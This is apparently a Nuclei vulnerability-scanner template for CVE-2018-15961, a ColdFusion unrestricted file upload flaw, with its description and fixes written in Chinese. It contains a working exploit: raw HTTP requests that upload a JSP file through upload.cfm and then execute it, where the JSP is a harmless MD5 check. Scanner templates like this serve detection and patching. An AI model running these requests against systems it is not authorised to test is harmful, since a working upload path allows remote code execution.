id: CVE-2018-15961
info:
  name: Adobe ColdFusion - Unrestricted File Upload Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Adobe ColdFusion upload.cfm 文件上传漏洞
    Adobe ColdFusion是美国奥多比（Adobe）公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。

    Adobe ColdFusion中存在安全漏洞，该漏洞源于程序未限制文件的上传。攻击者可利用该漏洞执行任意代码。以下版本受到影响：Adobe ColdFusion (2018年发布) 2018.0.0.310739版本，ColdFusion (2016年发布)Update 6及之前版本，ColdFusion 11 Update 14及之前版本。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://helpx.adobe.com/security/products/coldfusion/apsb18-33.html

    临时修复方案：
    1、服务器端将文件上传目录直接设置为不可执行。
    2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME Type、后缀检查等方式（文件类型做白名单限制）。
    3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。
requests:
- matchers:
  - type: word
    words:
    - ddbb3e76f92e78c445c8ecb392beb225
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=---------------------------24464570528145

    -----------------------------24464570528145
    Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
    Content-Type: image/jpeg

    <%@ page import="java.util.*,java.io.*"%>
    <%@ page import="java.security.MessageDigest"%>
    <%
    String cve = "CVE-2018-15961";
    MessageDigest alg = MessageDigest.getInstance("MD5");
    alg.reset();
    alg.update(cve.getBytes());
    byte[] digest = alg.digest();
    StringBuffer hashedpasswd = new StringBuffer();
    String hx;
    for (int i=0;i<digest.length;i++){
      hx =  Integer.toHexString(0xFF & digest[i]);
      if(hx.length() == 1){hx = "0" + hx;}
      hashedpasswd.append(hx);
    }
    out.println(hashedpasswd.toString());
    %>
    -----------------------------24464570528145
    Content-Disposition: form-data; name="path"

    {{randstr}}.jsp
    -----------------------------24464570528145--
  - |
    GET /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{{randstr}}.jsp HTTP/1.1
    Host: {{Hostname}}
